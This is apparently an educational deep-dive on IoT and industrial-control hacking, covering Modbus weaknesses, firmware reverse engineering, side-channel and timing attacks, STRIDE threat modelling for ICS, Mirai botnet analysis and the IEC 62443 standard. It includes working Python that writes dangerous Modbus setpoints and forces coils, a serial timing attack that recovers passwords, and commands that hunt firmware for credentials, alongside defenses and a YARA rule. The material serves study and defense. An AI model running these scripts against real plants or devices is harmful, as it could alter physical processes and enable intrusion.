# IoT & OT Hacking -- Deep Dive

> For authorized security testing, red team exercises, and educational study only.
> This document expands on the cheat sheet with protocol internals, attack
> methodologies, real-world case studies, and defense frameworks for IoT and
> Operational Technology environments.

---

## Prerequisites

- Networking fundamentals (TCP/IP, UDP, 802.15.4, serial protocols)
- Familiarity with embedded Linux and cross-compilation
- Basic reverse engineering concepts (disassembly, decompilation)
- Understanding of SCADA/ICS concepts from the cheat sheet
- Hardware tools: logic analyzer, Bus Pirate or FTDI adapter, multimeter
- Software: Binwalk, Ghidra, Wireshark, OpenOCD, mosquitto-clients

---

## 1. Modbus Protocol Vulnerabilities

Modbus was designed in 1979 for serial communication between PLCs. Modbus TCP (published 1999) simply wraps the serial protocol in TCP on port 502. It has no authentication, no encryption, and no integrity checking beyond a simple CRC in RTU mode.

### Protocol Structure

```
Modbus TCP Frame:
+------------------+------------------+------------------+
| MBAP Header (7B) | Function Code(1B)| Data (variable)  |
+------------------+------------------+------------------+

MBAP Header:
  Transaction ID (2B) | Protocol ID (2B) | Length (2B) | Unit ID (1B)
```

### Key Function Codes

```
Code   Function                  Risk
----   --------                  ----
0x01   Read Coils                Reconnaissance: read digital outputs
0x02   Read Discrete Inputs      Reconnaissance: read digital inputs
0x03   Read Holding Registers    Data exfil: read setpoints, configs
0x04   Read Input Registers      Data exfil: read sensor values
0x05   Write Single Coil         Attack: toggle single output on/off
0x06   Write Single Register     Attack: change a single setpoint
0x0F   Write Multiple Coils      Attack: bulk toggle outputs
0x10   Write Multiple Registers  Attack: bulk change setpoints
0x2B   Device Identification     Recon: vendor, product, version
```

### Attack Scenarios

**Reconnaissance**: An attacker with network access to port 502 can enumerate all registers and coils to map the physical process. No credentials are needed.

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('target', port=502)
client.connect()

# Read all holding registers (process setpoints)
for addr in range(0, 1000, 100):
    result = client.read_holding_registers(addr, 100, slave=1)
    if not result.isError():
        for i, val in enumerate(result.registers):
            if val != 0:
                print(f"Register {addr+i}: {val}")

# Read device identification
result = client.execute(
    ReadDeviceInformationRequest(read_code=0x01, object_id=0x00, slave=1)
)
```

**Process Manipulation**: Writing to coils or registers directly alters the physical process. A single write command can open a valve, change a temperature setpoint, or disable a safety interlock.

```python
# DANGER: This changes physical process values
# Write to holding register (e.g., change temperature setpoint)
client.write_register(40001, 999, slave=1)   # Set dangerously high value

# Write to coil (e.g., open a valve)
client.write_coil(0, True, slave=1)           # Force coil ON
```

**Man-in-the-Middle**: Because Modbus TCP has no integrity protection, an attacker positioned between the HMI and PLC can modify register values in transit. The HMI displays normal values while the PLC receives attacker-controlled commands.

### Defenses

- Deploy Modbus over TLS (not widely supported; use VPN or stunnel as a wrapper)
- Use application-layer firewalls that understand Modbus function codes (e.g., Tofino, Bayshore)
- Restrict Modbus to read-only function codes at the firewall where possible
- Implement allowlists for Modbus client IP addresses
- Monitor for anomalous register writes with ICS-aware IDS (Suricata with Modbus rules)

---

## 2. Firmware Reverse Engineering Methodology

Firmware reverse engineering follows a structured process from acquisition through vulnerability discovery. The goal is to understand the device's software, find security flaws, and identify attack vectors.

### Phase 1: Acquisition

Firmware can be obtained through multiple channels, listed from least to most invasive:

```
Method                   Difficulty   Destructive?
------                   ----------   ------------
Vendor website download  Trivial      No
Update mechanism sniff   Easy         No
Mobile app extraction    Easy         No
SPI flash dump           Moderate     No (clip) / Yes (desolder)
JTAG/SWD memory read     Moderate     No
Chip-off (decapping)     Hard         Yes
```

```bash
# Download from vendor (check support/downloads page)
wget https://vendor.example.com/firmware/device-v2.1.bin

# Intercept OTA update (set up MITM proxy)
mitmproxy --mode transparent --ssl-insecure

# SPI flash dump with clip (no desoldering)
flashrom -p ch341a_spi -r firmware_dump.bin
# Verify: dump twice, compare checksums
flashrom -p ch341a_spi -r firmware_verify.bin
md5sum firmware_dump.bin firmware_verify.bin
```

### Phase 2: Initial Analysis

```bash
# File type identification
file firmware_dump.bin
hexdump -C firmware_dump.bin | head -50

# Entropy analysis (high entropy = encryption or compression)
binwalk -E firmware_dump.bin
# Flat high entropy throughout = likely encrypted
# Mixed regions = unencrypted with compressed sections

# Signature and filesystem scan
binwalk firmware_dump.bin
# Look for: SquashFS, CramFS, JFFS2, UBIFS, U-Boot headers, kernel images

# Extract all identified components
binwalk -e firmware_dump.bin
cd _firmware_dump.bin.extracted/
```

### Phase 3: Filesystem Analysis

```bash
# Map the filesystem structure
find squashfs-root/ -type f | head -100
ls -la squashfs-root/etc/
ls -la squashfs-root/usr/bin/

# Priority targets for security review:
# 1. Credentials
grep -rn "password\|passwd\|secret\|api.key\|token" squashfs-root/etc/
cat squashfs-root/etc/shadow
cat squashfs-root/etc/passwd

# 2. Network services
cat squashfs-root/etc/init.d/*        # startup services
cat squashfs-root/etc/inetd.conf      # legacy network services
find . -name "*.conf" | xargs grep -l "listen\|bind\|port"

# 3. Certificates and keys
find . -name "*.pem" -o -name "*.key" -o -name "*.crt" -o -name "*.p12"

# 4. Web application files
find . -name "*.cgi" -o -name "*.php" -o -name "*.lua"
ls squashfs-root/www/ squashfs-root/usr/share/www/ 2>/dev/null

# 5. Shared libraries with known CVEs
find . -name "*.so*" | while read lib; do
    strings "$lib" | grep -i "openssl\|libcurl\|busybox" | head -1
done
```

### Phase 4: Binary Analysis

```bash
# Identify architecture
file squashfs-root/usr/bin/target_binary
readelf -h squashfs-root/usr/bin/target_binary

# Load in Ghidra for static analysis
# Focus on:
#   - main() and initialization routines
#   - Network socket handlers (socket, bind, listen, accept)
#   - String references to "password", "auth", "key", "admin"
#   - Command injection sinks (system, popen, exec)
#   - Buffer handling (strcpy, sprintf, memcpy without bounds)
#   - Crypto usage (hardcoded keys, weak algorithms)

# Emulate with QEMU for dynamic analysis
cp $(which qemu-arm-static) squashfs-root/usr/bin/
sudo chroot squashfs-root /usr/bin/qemu-arm-static /usr/bin/target_binary

# Firmware emulation with FAT (Firmware Analysis Toolkit)
# or EMUX for full-system emulation
```

### Phase 5: Vulnerability Identification

Common vulnerability classes in IoT firmware:

```
Category                Examples
--------                --------
Command Injection       User input passed to system(), popen()
Buffer Overflow         Fixed-size buffers with unchecked input (strcpy, sprintf)
Hardcoded Credentials   Default passwords in /etc/shadow, API keys in binaries
Insecure Protocols      Telnet, HTTP (no TLS), unencrypted MQTT
Path Traversal          Web server CGI with ../ in file parameters
Authentication Bypass   Debug endpoints, backdoor accounts, logic flaws
Weak Cryptography       XOR "encryption", ECB mode AES, hardcoded IV/key
Information Disclosure  Verbose error messages, stack traces, debug logs
```

---

## 3. Side-Channel Attacks on Embedded Devices

Side-channel attacks extract secrets by observing physical characteristics of a device during cryptographic operations rather than attacking the algorithm itself.

### Power Analysis

Power analysis measures the electrical power consumption of a device during cryptographic operations. Different instructions and data values draw different amounts of current.

**Simple Power Analysis (SPA)**: Direct visual inspection of power traces. Can reveal:
- Number of rounds in a cipher
- Conditional branches (if key bit = 1, do X; else do Y)
- Distinction between multiply and square operations in RSA

**Differential Power Analysis (DPA)**: Statistical analysis across many power traces. Works by:
1. Collecting thousands of traces during encryption with known plaintexts
2. Making hypotheses about intermediate values (using key byte guesses)
3. Correlating hypothesized power consumption with actual traces
4. Correct key guess shows statistically significant correlation

```
Equipment needed:
  - Oscilloscope (>= 200 MHz bandwidth, >= 1 GS/s sample rate)
  - Current probe or shunt resistor (0.1-10 ohm in VCC line)
  - Trigger mechanism (GPIO toggle or protocol-based)

Software:
  - ChipWhisperer (open-source, includes hardware + software)
  - Riscure Inspector
  - SCA-Toolkit (Python)
```

**ChipWhisperer Setup** (most accessible platform):

```python
import chipwhisperer as cw

# Connect to target and capture setup
scope = cw.scope()
target = cw.target(scope)
scope.default_setup()

# Capture power traces during AES encryption
traces = []
for i in range(5000):
    plaintext = bytearray(os.urandom(16))
    scope.arm()
    target.simpleserial_write('p', plaintext)
    ret = scope.capture()
    response = target.simpleserial_read('r', 16)
    traces.append(scope.get_last_trace())

# Run CPA attack
import chipwhisperer.analyzer as cwa
attack = cwa.cpa(traces, plaintexts)
results = attack.run()
# results.best_guesses() reveals AES key bytes
```

### Timing Attacks

Timing attacks exploit data-dependent execution time in cryptographic implementations.

**Classic example**: String comparison that returns early on first mismatched byte.

```c
// VULNERABLE: timing reveals correct bytes left-to-right
int check_password(char *input, char *stored) {
    for (int i = 0; i < len; i++) {
        if (input[i] != stored[i]) return 0;  // early exit leaks position
    }
    return 1;
}

// SECURE: constant-time comparison
int check_password_ct(char *input, char *stored) {
    int result = 0;
    for (int i = 0; i < len; i++) {
        result |= input[i] ^ stored[i];  // no early exit
    }
    return result == 0;
}
```

**Practical timing attack on embedded device**:

```python
import serial
import time

port = serial.Serial('/dev/ttyUSB0', 115200)
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
known = ''

for position in range(8):  # 8-char password
    best_char = ''
    best_time = 0
    for c in charset:
        guess = known + c + 'A' * (7 - position)
        times = []
        for _ in range(100):  # average over 100 attempts
            start = time.perf_counter_ns()
            port.write(f"AUTH {guess}\n".encode())
            port.readline()  # read response
            elapsed = time.perf_counter_ns() - start
            times.append(elapsed)
        avg = sum(times) / len(times)
        if avg > best_time:
            best_time = avg
            best_char = c
    known += best_char
    print(f"Found: {known}")
```

### Electromagnetic (EM) Emanation Attacks

EM probes can capture signals from specific chip regions without physical contact to power lines. Useful when:
- Power measurement is blocked by decoupling capacitors
- Multiple chips share a power rail
- Non-invasive access is required

### Fault Injection

Deliberately causing computational errors to bypass security:

```
Method              Effect                         Use Case
------              ------                         --------
Voltage glitching   Skip instructions, corrupt     Bypass secure boot,
                    computations                   skip password check
Clock glitching     Race conditions, skip cycles   Bypass crypto verification
Laser injection     Flip specific bits in SRAM     Target specific registers
EM pulse            Localized fault injection       Non-invasive alternative
                                                   to laser
```

### Countermeasures

- Constant-time implementations for all cryptographic operations
- Random delays and dummy operations to mask timing
- Masking: split sensitive values into random shares
- Amplitude and temporal noise injection on power lines
- Metal shielding and active mesh tamper detection
- Dual-rail logic (process both bit values simultaneously)
- Sensors for voltage, clock, temperature, and light anomalies

---

## 4. ICS/SCADA Threat Modeling (STRIDE for ICS)

STRIDE threat modeling adapted for ICS environments accounts for the unique characteristics of operational technology: safety implications, legacy protocols, and availability requirements.

### STRIDE Categories Applied to ICS

**Spoofing Identity**
```
IT Equivalent:    Forged credentials, stolen tokens
ICS Manifestation:
  - Spoofed Modbus Unit IDs (no authentication to verify)
  - Forged DNP3 source addresses
  - Impersonating an HMI to send commands to PLCs
  - Rogue engineering workstation on the OT network
  - Replayed S7comm sessions (no session binding)

Impact: Unauthorized process commands executed with assumed identity of
        legitimate operator or controller.
```

**Tampering with Data**
```
IT Equivalent:    Modified database records, altered files
ICS Manifestation:
  - Modified Modbus register values in transit (MITM)
  - Altered historian data to hide process anomalies
  - Changed PLC logic (ladder logic injection)
  - Tampered sensor calibration values
  - Modified safety system setpoints

Impact: Physical process operates outside safe parameters while
        monitoring shows normal values. Safety systems may not trip.
```

**Repudiation**
```
IT Equivalent:    Denying an action, no audit trail
ICS Manifestation:
  - No logging of Modbus read/write operations
  - PLC logic changes without change management
  - HMI actions without operator authentication
  - Missing audit trail for safety system overrides
  - Lack of forensic data from embedded devices

Impact: Cannot determine root cause of safety incidents or
        attribute process changes to specific actors.
```

**Information Disclosure**
```
IT Equivalent:    Data breach, credential exposure
ICS Manifestation:
  - Modbus traffic readable by any network observer
  - Process values reveal production secrets (batch recipes)
  - PLC firmware exposes proprietary control algorithms
  - Network scanning reveals complete OT asset inventory
  - Historian data exfiltration reveals operational patterns

Impact: Industrial espionage, competitive intelligence gathering,
        pre-attack reconnaissance.
```

**Denial of Service**
```
IT Equivalent:    DDoS, resource exhaustion
ICS Manifestation:
  - PLC crash via malformed packets (many PLCs lack input validation)
  - Network flooding on the OT network (flat networks amplify impact)
  - Historian database corruption blocking trend analysis
  - Safety system communication disruption
  - Ransomware on HMI/SCADA servers

Impact: Production shutdown, safety system blindness, potential
        physical damage if safety controllers are affected.
```

**Elevation of Privilege**
```
IT Equivalent:    Admin access from user account
ICS Manifestation:
  - Operator escalation to engineering mode on HMI
  - Jumping from IT network into OT network (pivot through IDMZ)
  - Exploiting EWS to push malicious PLC logic
  - Accessing safety system from process control network
  - Using maintenance laptop as bridge between zones

Impact: Full control of physical process, ability to modify
        safety systems, potential for catastrophic physical damage.
```

### Threat Modeling Process for ICS

```
1. Identify Assets
   - Physical processes (what does the system control?)
   - Safety systems (SIS, emergency shutdown)
   - Controllers (PLCs, RTUs, DCS)
   - Network infrastructure (switches, firewalls, data diodes)
   - Historian and SCADA servers

2. Create Data Flow Diagrams
   - Map Purdue model levels
   - Document all protocols between zones
   - Identify trust boundaries (where does authentication change?)
   - Mark all external connections (VPN, vendor access, cloud)

3. Enumerate Threats per STRIDE
   - Apply each STRIDE category to each data flow
   - Consider cyber-physical consequences (not just data impact)
   - Weight threats by safety impact (SIL levels)

4. Prioritize by Consequence
   - Safety (loss of life, environmental damage)
   - Production (downtime cost, equipment damage)
   - Compliance (regulatory fines, audit findings)
   - Reputation (public trust, customer confidence)

5. Identify Countermeasures
   - Map to ISA/IEC 62443 security levels
   - Consider operational constraints (24/7 uptime, patching windows)
   - Balance security controls with safety requirements
```

---

## 5. Mirai Botnet Architecture and IoT Malware Analysis

Mirai (2016) demonstrated that massive botnets could be built from IoT devices. Understanding its architecture illuminates the ongoing IoT malware threat.

### Mirai Architecture

```
                    +------------------+
                    |   C2 Server      |  Command & Control
                    |  (CNC)           |  - Bot management
                    +--------+---------+  - Attack commands
                             |            - Web panel (port 101)
                    +--------+---------+
                    |   Report Server   |  Receives scan results
                    |                  |  from infected bots
                    +--------+---------+
                             |
              +--------------+--------------+
              |              |              |
        +-----+----+  +-----+----+  +------+---+
        | Bot      |  | Bot      |  | Bot      |  Infected IoT
        | (ARM)    |  | (MIPS)   |  | (x86)    |  devices
        +-----+----+  +-----+----+  +------+---+
              |              |              |
        Scan + Infect   Scan + Infect  Scan + Infect
              |              |              |
        +-----+----+  +-----+----+  +------+---+
        | New      |  | New      |  | New      |  Newly
        | Victim   |  | Victim   |  | Victim   |  compromised
        +----------+  +----------+  +----------+
```

### Infection Lifecycle

```
1. Scanning
   - Bot generates random IPs (avoids DoD, IANA, GE, HP, US Post Office ranges)
   - SYN scan on port 23 (Telnet) and 2323
   - Stateless scanning: raw SYN packets, no full TCP stack
   - ~100 scan threads per bot

2. Credential Brute Force
   - 62 hardcoded username:password pairs for IoT devices
   - Examples: admin:admin, root:root, root:vizxv,
     root:xc3511, admin:7ujMko0admin
   - Sequential attempt, no rate limiting needed (devices don't lock out)

3. Reporting
   - Successful credentials sent to Report Server
   - Report includes: IP, port, username, password

4. Loading
   - Loader connects to victim using reported credentials
   - Determines architecture: echo/cat /proc/cpuinfo, or try each binary
   - Downloads appropriate binary via wget/tftp/echo method
   - Supports: ARM, MIPS, MIPSEL, x86, SH4, PPC, SPARC

5. Execution
   - Bot resolves C2 domain, connects on port 23
   - Kills competing malware (binds to ports to prevent reinfection by others)
   - Deletes its own binary from disk (runs from memory)
   - Begins scanning for new victims
   - Awaits DDoS attack commands from C2
```

### Attack Capabilities

```
Attack Type          Description
-----------          -----------
UDP flood            Volumetric, random payload
VSE flood            Valve Source Engine query flood
DNS resolver flood   Recursive DNS queries to overwhelm resolvers
SYN flood            TCP SYN with randomized headers
ACK flood            TCP ACK for stateful firewall bypass
STOMP flood          TCP connection + data flood
GRE flood            GRE encapsulated floods
HTTP flood           GET/POST with randomized headers
```

### Notable Mirai Attacks

```
Date         Target            Impact
----         ------            ------
Sep 2016     KrebsOnSecurity   620 Gbps, largest DDoS at the time
Sep 2016     OVH               1 Tbps from ~145,000 cameras/DVRs
Oct 2016     Dyn DNS           Major internet outage: Twitter, Netflix,
                               Reddit, GitHub inaccessible
Nov 2016     Deutsche Telekom  900,000 routers offline (Mirai variant)
```

### Post-Mirai Evolution

After the Mirai source code was released on HackForums (Sep 30, 2016), dozens of variants emerged:

```
Variant      Added Capability
-------      ----------------
Satori       Exploited Huawei router zero-day (CVE-2017-17215)
Okiru        Targeted ARC processor architecture
Masuta       Added router exploit (EDB 38722)
OMG          Added proxy functionality for traffic tunneling
Mozi         DHT-based P2P C2 (no central server)
BotenaGo     Written in Go, embedded 30+ exploits
HEH          Wiper functionality (destructive)
```

### IoT Malware Analysis Methodology

```bash
# 1. Safe acquisition: capture from honeypot or sandbox
# Set up Cowrie SSH/Telnet honeypot
docker run -p 2222:2222 cowrie/cowrie

# 2. Static analysis
file malware_sample
readelf -h malware_sample          # architecture
strings malware_sample | less      # C2 domains, credentials, strings
binwalk malware_sample             # packed/embedded content

# 3. Identify C2 infrastructure
strings malware_sample | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
strings malware_sample | grep -E '[a-z]+\.(top|tk|xyz|pw|cc)'

# 4. Behavioral analysis (QEMU emulation)
# Install QEMU user mode for target architecture
qemu-arm-static -L /usr/arm-linux-gnueabi/ ./malware_sample
# Monitor with strace:
qemu-arm-static -strace ./malware_sample

# 5. Network analysis
# Run in isolated network with inetsim for fake services
sudo inetsim --bind-address 10.0.0.1
# Capture traffic:
tcpdump -i eth0 -w malware_traffic.pcap

# 6. YARA rule creation
# Write signatures for detection
rule Mirai_Generic {
    strings:
        $s1 = "/bin/busybox" ascii
        $s2 = "/proc/self/exe" ascii
        $s3 = "TSource Engine Query" ascii
        $cred1 = "admin:admin" ascii
        $cred2 = "root:vizxv" ascii
    condition:
        uint32(0) == 0x464C457F and  // ELF magic
        3 of them
}
```

---

## 6. ISA/IEC 62443 Security Levels

ISA/IEC 62443 is the primary international standard for industrial automation and control systems security. It defines a framework of security levels, zones, conduits, and requirements.

### Standard Structure

```
ISA/IEC 62443 Series:
  62443-1-x   General concepts, terminology, metrics
  62443-2-x   Policies & procedures (asset owner requirements)
  62443-3-x   System-level requirements (system integrator)
  62443-4-x   Component-level requirements (product supplier)
```

### Security Levels (SL)

Security levels define the degree of protection against increasingly sophisticated threat actors:

```
Level   Threat Actor           Capability           Example
-----   ------------           ----------           -------
SL 0    No protection          N/A                  Isolated test system
SL 1    Casual/accidental      Low skill, no        Curious employee,
                               specific motivation   accidental error
SL 2    Intentional, low       Generic hacking      Hacktivist, disgruntled
        resources              tools, moderate       insider, script kiddie
                               ICS knowledge
SL 3    Intentional,           Sophisticated         Organized crime,
        moderate resources     tools, specific ICS   corporate espionage,
                               expertise             skilled attacker
SL 4    Intentional,           State-level APT       Nation-state actors
        significant            resources, custom     (Stuxnet, TRITON
        resources              zero-days, extended   threat actor level)
                               campaigns
```

### Foundational Requirements (FR)

Each security level must satisfy seven foundational requirements:

```
FR   Requirement                    SL1 Controls            SL3/4 Controls
--   -----------                    ------------            --------------
FR1  Identification &               Unique user IDs,        MFA, certificate-
     Authentication Control         role-based passwords     based auth, no
                                                            shared accounts

FR2  Use Control                    Role-based access,      Least privilege,
                                    session timeout          permission on
                                                            individual objects

FR3  System Integrity               Input validation,       Code signing,
                                    basic AV                 integrity monitoring,
                                                            whitelisting

FR4  Data Confidentiality           Protect credentials     Full encryption of
                                    at rest                  data at rest and
                                                            in transit

FR5  Restricted Data Flow           Network segmentation,   Data diodes,
                                    basic firewall rules     application-layer
                                                            filtering, DPI

FR6  Timely Response to Events      Basic logging,          SIEM integration,
                                    manual monitoring        automated alerting,
                                                            forensic readiness

FR7  Resource Availability          Basic redundancy,       Hot standby, auto-
                                    manual failover          failover, DDoS
                                                            protection
```

### Zones and Conduits in Practice

```
Zone Definition Requirements:
  1. Logical grouping of assets with similar security requirements
  2. Each zone assigned a target security level (SL-T)
  3. Assets within a zone must meet or exceed the zone's SL-T
  4. Zones should minimize the number of conduits (attack surface)

Conduit Requirements:
  1. All communication between zones flows through conduits
  2. Conduits must be secured to the higher SL of the two zones
  3. Conduit security controls: firewall, IDS/IPS, authentication
  4. Data diodes for unidirectional flows (e.g., historian replication)

Example Zone Architecture:
  +------------------------------------------+
  | Zone: Enterprise (SL 1)                  |
  |   Email, ERP, web browsing               |
  +------------------+-----------------------+
                     | Conduit: IT-IDMZ (FW + IDS)
  +------------------+-----------------------+
  | Zone: IDMZ (SL 2)                       |
  |   Jump server, patch server, historian   |
  |   mirror, remote access gateway          |
  +------------------+-----------------------+
                     | Conduit: IDMZ-OT (FW + data diode)
  +------------------+-----------------------+
  | Zone: SCADA/DCS (SL 3)                  |
  |   SCADA servers, historians, HMI, EWS   |
  +------------------+-----------------------+
                     | Conduit: Control-Field (managed switch)
  +------------------+-----------------------+
  | Zone: Field Devices (SL 2)              |
  |   PLCs, RTUs, I/O modules               |
  +------------------+-----------------------+
                     |
  +------------------+-----------------------+
  | Zone: Safety (SL 4)                     |
  |   SIS controllers, safety I/O           |
  |   Air-gapped or hardware-enforced        |
  |   unidirectional from process network    |
  +------------------------------------------+
```

### Maturity Assessment

Organizations assess their current security level (SL-A) against their target (SL-T):

```
Step 1: Asset inventory and network topology mapping
Step 2: Define zones and conduits
Step 3: Risk assessment per zone (consequence-based)
Step 4: Assign target security level (SL-T) per zone
Step 5: Assess current security level (SL-A) against FR requirements
Step 6: Gap analysis: SL-T minus SL-A = remediation needed
Step 7: Remediation plan with prioritization by risk
Step 8: Ongoing compliance monitoring and reassessment
```

### Certification

```
Component Certification (62443-4-2):
  - Product suppliers certify devices to a specific SL
  - Certified by: ISASecure (ISCI), TUV, exida
  - Covers: embedded devices, network components, host devices, software

System Certification (62443-3-3):
  - System integrators certify complete solutions
  - Covers: zone architecture, conduit security, system hardening

Process Certification (62443-2-4):
  - Service providers certify their integration/maintenance practices
  - Covers: patch management, incident response, change management
```

---

## Further Reading

- Practical IoT Hacking (Fotios Chantzis et al., No Starch Press)
- The ICS Cybersecurity Cookbook (Hacking and Defending Industrial Control Systems)
- NIST SP 800-82 Rev 3: Guide to Operational Technology Security
- ISA/IEC 62443 Full Standard Series
- MITRE ATT&CK for ICS: https://attack.mitre.org/techniques/ics/
- Dragos Year in Review Reports: https://www.dragos.com/year-in-review/
- CISA ICS-CERT Advisories: https://www.cisa.gov/news-events/ics-advisories
- ChipWhisperer Documentation: https://chipwhisperer.readthedocs.io/
